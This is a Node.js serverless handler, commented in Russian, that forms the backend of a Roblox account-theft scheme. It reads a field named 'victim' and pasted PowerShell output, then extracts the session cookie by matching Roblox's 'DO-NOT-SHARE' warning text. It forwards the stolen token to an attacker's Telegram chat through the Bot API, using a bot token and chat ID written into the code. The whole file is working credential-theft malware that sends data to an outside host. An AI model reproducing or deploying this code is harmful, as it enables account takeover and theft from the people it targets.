const fetch = require('node-fetch');

exports.handler = async (event) => {
    // Разрешаем только POST
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { victim, code } = JSON.parse(event.body);
        if (!victim || !code) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Missing fields' })
            };
        }

        // Извлечение токена (та же логика, что в Python)
        const tokenPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^"]+/;
        const hasWarning = code.includes("WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items");
        let token = null;
        if (hasWarning) {
            const match = code.match(tokenPattern);
            if (match) token = match[0];
        }

        if (!token) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Invalid PowerShell format' })
            };
        }

        // Отправка в Telegram через Bot API
        const botToken = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
		const chatId = "-5527664230"; // свой ID
        if (!botToken || !chatId) {
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Server configuration missing' })
            };
        }

        const message = `🆕 Token for ${victim}:\n${token}`;
        const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!tgResponse.ok) {
            const errText = await tgResponse.text();
            console.error('Telegram error:', errText);
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Failed to send to Telegram' })
            };
        }

        // Возвращаем токен клиенту
        return {
            statusCode: 200,
            body: JSON.stringify({ token })
        };
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};